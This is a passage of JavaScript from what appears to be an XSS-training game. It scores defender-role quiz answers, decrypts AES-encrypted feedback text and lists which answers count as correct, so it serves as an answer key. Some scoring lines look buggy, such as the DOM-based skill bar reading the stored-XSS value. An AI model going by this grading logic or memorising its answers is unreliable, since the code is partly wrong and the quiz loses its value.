        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;

        levelsCompleted.push("R0L9");

        rolesPlayed.push("Attacker");
        LastPlayedRole = "Attacker";
        completionTime = timeLimitInSeconds;



    } else if (roleId == 1 && (currentLevelNo == 1 || currentLevelNo == 200)) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19nYofdvyl8WVH4zleRyCtSyOiYLN3Fx0DmtVlUOTP8LadWX+rA4bs+", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[2]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19lbrDmYadOOXf2rSTT+SKLCe2NXh/8uRnGROabaStGS+uf8H1pM1aRt6m7EcQ+vaaJ2Pd1B02MjBXlL6topG3exOGzCcArY9+kLWT5F0Eup2+YHUf2LuNAGpBkp2E42UzUXCbGYhc8moqNPY9VXhc8XPWeA672ZgV6VdxpDVeutRTyg/DBINJrB9SyqFPx8fyqMS7/cU0tCo644JeYicTCuEtrwB6yaGLq7PwfUhPEhjdDeGWrSxZgiIQpVE5bgwRf84p1JSTIcM2Pg33EldVcRlrIq56o0xZW9ZI3kH+UjhvvEFB63foA9FgiwOqM97+fiVLeqgAkoyp3n26rjHrz5+acHZ26rX3atag7ATdCFEdyWK6SWiRVKHhNPm1dTrXyLxeE+NUSjmpbKFAI96oVo8WW9PwZGLPwqrqls6st6WI2PKd0PsMr6QWAqoCm35CyuX0IUQsqKdcAx7zrVd1A34Ju2CXzrBhpLLNUrnESyeNWzMLUNEP7aSu7KJ+rX5MzEM7zdmzpTGzDUSkizgdxlmFJBb2tFSE3IuFV+jeWbuXxmVVZPDHM1IRbK5e5XPg8ehAD5e1itlcn+/8+4UcypTmMuHrwQHisTsPI+c/rsC7UEFmWkaRR", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX18scMmFu13y6NBY1AG2i5iXJHYPz9JCFS5KqfZ5tRtEzcm7EeY/vlZE", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[1]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1/KEO+lNXyaisaHz1CYArIJS6FYuE0XG5d0uJX8h+jZtqef4Ms4UlKywezygq9JV8wV4LfoJbe19kFy5Lb6JW6GfcYOzOg087oSVIDGHcr66xq0S9QyOF//k5n1G0F04lzAeh8HKdWLck9Kz/qE3e1C6ERekMj1eSIcGDozLiKIeQIXG9YR+ycMu2Hw7aCPD8K4kNNCRxTYJSpaUoHjfRgiVuFvXO5ZN/66npspl/c42YWKQXaBr85Xx4UQesqidLIjzr4UuYbtRU7IwQmYYB14bJ027UVzjjU57ovx7MKUKymMELjD31/ANunIGT4++O0oHUmNXJVXOJNT+Rlh0Ug6SgWiU+yyKMc=", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:1,Level:1");
        currentLevelNo = 2;

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            DefenderReflectedSkillsValue = DefenderReflectedSkillsValue + defenderRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;

            correctDefenderAnswersList.push("R1L1Q1A1");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            DefenderReflectedSkillsValue = DefenderReflectedSkillsValue + defenderRefOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;

            correctDefenderAnswersList.push("R1L1Q1A3");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            incorrectDefenderAnswersList.push("R1L1Q1A2");

            OverallStoredSkillsValue = overallStoredOffset - 2;
            DefenderStoredSkillsValue = DefenderStoredSkillsValue - 2;

            if (DefenderStoredSkillsValue < 0) {
                DefenderStoredSkillsValue = 0;
            }

            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }



            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            incorrectDefenderAnswersList.push("R1L1Q1A4");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;

        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;

        levelsCompleted.push("R1L1");

    } else if (roleId == 1 && currentLevelNo == 2) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+qHS1laNqnElapo725wTWKWWTM3BW0Mnv1ItABfho2FAbrzK/sweGk", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[2]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+jgciTYvt+2B373U+QPz9Um4JUqSUfi+1R53Iz3pcz6IWV0dxFY8sYUUpgzEj15bSqPG4xBg3YsCZ4btjVXdDz+5twSPxo2aAREoUymt5w+IVWsv+pC+kKBaw1Pv4f9j8ISLgq2oLv7VgEwV6qCvBlg3ZAIbtmU7XUVK5ZB2s98iycp5GoLLxBGiGdurvL9xvRNbHIGkhki5UR2Sxm6vV4zm1Dg4FeaYLngk+hEyOlcuhfxHnIKrjWd3G23yCQrbNGpc1v1OXIDZbxjMErF0ixij2yzKbqeY3r0tK0YbVbTHEN+/bZq3tkTxkVrNRL/7AVdTHDQudBni+TpiLb8EkB9ZhNneOyUN7HxhYbuPzbiq4Oh1wuoM/fuvFQshTZjnrVfkZFr6V/MHA4hhaMNjeVt9DcFn429pUVZtLsumVk79EjuRPKn6EnPI0E4uaKL1AC1VTRCq2ykA79HFReNgH+H667qxdKUlDINfU/Rhm3e2H/rJkULB2hQ663rUr7CB8cWnwWZB2hgcgf11Bii9sUGnr8F9t+9grNWUTuu5wtUFHv0Yg+lD/b+dsKgby8wOO+CGTTPa27Py8j4CXQHO0DbKQizDihfmI=", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19L8BaroK1LhA6RqJdovAkrCCyprzipJrPuBY5T9GEo94uhs0veRV39", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX186fi99Q/Y+tDbozCkAdEIcbB7ydPczTsBCDCoNemlx0+BV8c7FtG1NomUS9LzN96FitcC2DmuD6mFlgGeOTTzPIR1xTASRkavffoQQC10ON/NzJDtF8U9u+OGrdM+PXtt4cH0uDqzzGdL2xB93y0qi3UUKISVBPmRwEmb1fLkDBJFOYEXM8/Q7XU4V7cUg7S5CCzyRKy42fzpPyRVgUZP41Hv/FddHLhuVFMdhTc/gMMCgieIHzdVrYQ2C7GfIF1Qm0PweGMKi1Ok8X9yncdUApZE+oMMxUw4=", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:1,Level:2");
        currentLevelNo = 3;
        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            DefenderStoredSkillsValue = DefenderStoredSkillsValue + defenderStoredOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctDefenderAnswersList.push("R1L2Q1A3");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            DefenderStoredSkillsValue = DefenderStoredSkillsValue + defenderStoredOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctDefenderAnswersList.push("R1L2Q1A4");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            incorrectDefenderAnswersList.push("R1L2Q1A1");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            incorrectDefenderAnswersList.push("R1L2Q1A2");

            DefenderReflectedSkillsValue = DefenderReflectedSkillsValue - 2;

            if (DefenderReflectedSkillsValue < 0) {
                DefenderReflectedSkillsValue = 0;
            }


            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;


            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }


            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;

        document.getElementById("Stored-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS").value = Math.ceil(OverallStoredSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;
        levelsCompleted.push("R1L2");
    } else if (roleId == 1 && currentLevelNo == 3) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX182suK2pu2Yq1QKNWCcL72NyNrCXQHFVb+1OpQXodZkQ8ECReE1gbN1", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + ',' + String(tileLocations[2]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+Stz4WNjVHLnn7okYy8IeNtw8xVAMBo9+iZaVCDlF5bxWSWlT2vgX6mkjrrPpLZGav8aO6TKy39P7OTu78OKzHC+ti7Nx3TZhwOvwLUq+wuoUtaEx5n3DNFIFL2GqKqMN0+tebUfIXv0WcCTaNN7cCo5xH26T8gczhC7HFfOAlm/llnGsLBuQzOppITwR+9R69+yrJDxVAScTPZqvStCYh/GJZDo7mryTneSXEluxSMT73kUt65yOsm8bFZ+pL0/7rO1Qxkphbbj2Y1pcU31V+28DUdujo6RWmViM/Nd034EcdhUWF5ysbsJg/Bkk/kMooSvyl0lJtrQEMzCJLG7Y5hyyzVNzw78AieZx7+UANoToDQ07rT3okgIg1cYpwKoqdGO1qnmYsTt4AnZ/yOffACusdbGSNxH51b5jhmBMPOK7b7sAnRTNenxGNiAszovKLoKqVbujNWZ7iGpnZ3qlAUo9XGik1G1v2xzx6jU/5U1leNj5OiVJJrDjisNB8GMGkA+El5Z7EizKX8YDAU1f1lfNSmBjbNp2pc8yyW0zDZJBRAF6P5tIcZH79eeHyqfvCzFfLdxVfVa38fIv7JtXt3l3C1aCsGFwBkrRZDeEKSGT6/KQfBc8GLOkwlk4DkAJxPnqt1y4g6BnUBuOwyUIWBjeYsiHbYqeVIUHGfytcMyVqtl9zYrS4f6CXjtiNshJX1dvX1IgpylgTlH2nlwPA/Pw/O8Ba2O+aKgh2juIOt+bEjfniXYiNmzjSaNQwrQCD3C1SIyYjmpcucBrQVuKt4MjJqLDOPOyKSj2uLWdpYyEIThHyWeawXAul8n/A54kSdB2CGREyUnCrhIH8Cvr908G8PHdKxia2+Kqp3YFRPsuyalV/ZT+n39KWk7GAhWH25sa/flSBWIetk67y47mybWzw2tu0+2kmiroXvnmemEcq1ndjcsXt3QJwZ5wj0PfksJVzo3AcihK1W4j9xN+a90Av4+7YQLN1WXeakyez6w7XqMoXUAeb25AcR6/W5jGWQU5wfN7i6UbvcObVPkOq82J3LzHh0XsicEBlKuqLlD3B/Cnna40x0EeQD58HxBpAXjLAkhwfvoUBaZUExx30G8p4XLHI6Ls/gcSs7sp1WNM5xCC9GhGjUzB6K+0es2j48LawfwMhbrZEIvf8PkoYuFGZrlWI0kw2OKteNdI7oGLmHCkWlgo99IyOrff696/Xctuh5rFEXY9L4XmtVkUGNvDVYbYjtz0=", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19UjdtWwpoqW5RKLVCXB//yu93uWwiN/jIsVbzD2tG2iwBJBJ+GHLwR", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19PbMfhj8z9vkQTatJZlDwatt+sPH8u1FOsyJG9aOswgkzAYYYMZ+bBCIbkvqbSC2eI8h6ZdFwaP8DZUyBoM48CBvRMeJ1yPhJ52REbEUisglU9zNUh/gbUBIlXTh9X/hzMtbX1BCOjWXmU/07GqbC2nZRAuDjcUeE=", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:1,Level:3");
        currentLevelNo = 4;
        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue + defenderDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctDefenderAnswersList.push("R1L3Q1A1");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue + defenderDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctDefenderAnswersList.push("R1L3Q1A2");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue + defenderDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctDefenderAnswersList.push("R1L3Q1A3");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            incorrectDefenderAnswersList.push("R1L3Q1A4");

            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue - 2;

            if (DefenderDOMBasedSkillsValue < 0) {
                DefenderDOMBasedSkillsValue = 0;
            }



            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;



            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;

        document.getElementById("DOM-based-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS").value = Math.ceil(OverallStoredSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;
        levelsCompleted.push("R1L3");

    } else if (roleId == 1 && currentLevelNo == 4) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+oLhTeY65mGSpfcMACYlIJbIBB93dKD8kZNqZjh2bU/OHJkYpfi0Rr", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + ',' + String(tileLocations[2]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1/Afca+0LPxibZTzmcu9SMPYW50qNP+i4BWQj9AkdIEYI/PtIAFSFcLYsl8thrECHgHevua0u4xsXn6UzytHR5BkLUmRU4Td9c6W3O1qid1ySIiVboM2ITMIL2qfPfmWLyFeGH+618vOWcvPa88FaFX/qvJjbAu0eUBExqzxL0TiLjO7kZj0zrntBIadv1Bh1Tu6vhO+DXDhXAnwFrP6EKzWKwXMeHJudggTNQlTvrYECNA1sGYPjmrfIbhOZcLJjFq4aUEuDtO4a7PvV699c0Nvg7YxXNHBTq3gv1r7olAHUQOdWI/MdwLG0YpNQzQJWk/LchWnyU1l1BHDtxZjyb4juhX62zZOcLzD1XgdOLl6LAfwndBfc+mKEWFG1HLYwvQaHob7OTjv8oscsu0nwyqH323qpMLtlN73SJcX9RGwWuKpk9qO9vP13RODbqlKncbac4TAZnNB/gaz6ew24W5MPHzdrFQS6vB2hF+TDgKR8rAxWUKtWOyUonusVcea+g+EfwgyeVqLOD/v7Mv0rSq9qrC8L2eddo/8PgktG1I9xZhiQ47KXQq22Xt87+kUgK36ly0bMf3fI0TaNJq8jeIEiRxfcJPGj/xqPVHN3625DPijdzn6JSyXKiBrBsAEL50xi/1J13xIA03eKS+8w6uFtDfiRhedvQ2Cz4DViXjmD23qDYzmdyfED2FE7VWN0E7/8V3QMDXtYt/+FJKu6nU1ZzubmZWW3PG16I61eMIBO7iRUA32ByuhxevgDpD367Y981bCYx1on2OZRxOoTnk10pGm8az0SFUeY78DfU1x93ex+EsdTzS366BwCBNLOus+Xo8IBVLueNfVh5QvtjN0ugjZZ21hsoVC66oqUgI2UHQJyrBrX/FZwiF0+s3i2P8wH7mIb0n8cXJidcU3+djcEaC45G9aJb1T05EHxHKfm/OdUn8X8xL4cvAV4KMxVVClVdo2yS8JzU2e9X6iJNpvwIqizf655c=", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+vDMsuynpn1N7funays5MUQ7tqis46y1ttCkJkQmPRZrGEFBbS8Vo8", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+ljGjezIiurnFjDvpt/ZWT+DhAfVe7dm52Y1vJVfXqIPMUdH32Xh7eYVpR1hVcxV9QNI6hphXo97XKmWDDqWEi5tcCUeEs6U2MkbdcNh1wbtOZCrfjTWRStBmxndGhRMyfa1y5SRzYUjbFmi2HYZti694i/Cy+lCJQSp1eswvqEUrbBSBvxItAtFvQYU/3bkHIYkceCe5U59gDhu7Zv1kLjn7ZqOUmmGSLadGwTMR53p2ddJksjrNTxsBqriA6C/2wlRIP/aeGCTfQmfep19ib93dm/0oX7H1mEYldwJ0awdPaPBS26MB5oM23JgMcEEjMqrHxMTzFZg==", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:1,Level:4");
        currentLevelNo = 5;

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue + defenderDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctDefenderAnswersList.push("R1L4Q1A1");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            incorrectDefenderAnswersList.push("R1L4Q1A4");
            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue - 2;

            if (DefenderDOMBasedSkillsValue < 0) {
                DefenderDOMBasedSkillsValue = 0;
            }



            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;




            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }

            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue + defenderDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctDefenderAnswersList.push("R1L4Q1A2");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue + defenderDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;

            correctDefenderAnswersList.push("R1L4Q1A3");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;

        document.getElementById("DOM-based-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS").value = Math.ceil(OverallStoredSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;

        levelsCompleted.push("R1L4");




    } else if (roleId == 1 && currentLevelNo == 5) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+yaiVBRtAfB6Qrbujr6SMB2oPOQI4iBEm8Ls+Zm3vHRjUlDilp8MpQ", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+2kgRHzktBYOWuJT6jGg3Vl6rGDBpyeTttwGNZeaSlmD882IV30xD6wzc4U93CUuQdBkXzk80+i3H+H6n5uZtbbQEJzHxw6TYHZ0LNC+GMHhBHDjT6UecwkF87s674O1yU6ZIf+cwB8v/Zicd1dxBzFZfXfbYqcc7P4Jr2H6arrBWwRdG6KFv79GpDwtRofbVneH1GqdJ5TW2FczCZBC/X1Kwn2vU6zQY/bdM4sUCWA5OXIR6QF7UQ6cLcd/PI0ane6jnL5Fj3SSfjQH8HkO8JdRZbbsuGHbL9jzYmfCz3JQzQbcUsq+l1gXwvpwyac1mTNiHrufrymn8rhmmYv9hcoCcxytkY4J/PfZS5J0pzcTmWwzEm9C4ac8Ce+tPBat9gm6bPTdtbWmMZA8dDhnJHz0v6qgRuxFw=", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1/PXLK4LfxMdJKPw8Im327UlfNFG3qdKMJQXKy5N5qpWRfW5jHAuyVV", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[2]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+iEmiC1COjaV8HDMpHNbTu/sMF5EDgEFg6BBMQlMSTtMPg0vKzEBBsWmsQOg8kyy4IzrcDjdnVzxHiCVeKOdvlFbb/XR2WFIKRouwjllYLueTZ35jfY61l+WrGyl7pmflePV5utCEP+w==", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:1,Level:5");
        currentLevelNo = 6;

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            DefenderStoredSkillsValue = DefenderStoredSkillsValue + defenderStoredOffset;
            DefenderReflectedSkillsValue = DefenderReflectedSkillsValue + defenderRefOffset;
            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue + defenderDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctDefenderAnswersList.push("R1L5Q1A1");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            incorrectDefenderAnswersList.push("R1L5Q1A4");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            DefenderStoredSkillsValue = DefenderStoredSkillsValue + defenderStoredOffset;
            DefenderReflectedSkillsValue = DefenderReflectedSkillsValue + defenderRefOffset;
            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue + defenderDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctDefenderAnswersList.push("R1L5Q1A2");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            incorrectDefenderAnswersList.push("R1L5Q1A3");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;

        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS").value = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value").innerText = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS").value = Math.ceil(OverallDOMBasedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;


        levelsCompleted.push("R1L5");

    } else if (roleId == 1 && currentLevelNo == 6) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+7VTVSo78zC51Z0Phz5E+//TqhmQaACMlVweZoI3hEh+NhTOvysH/0", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[3]) + '.';
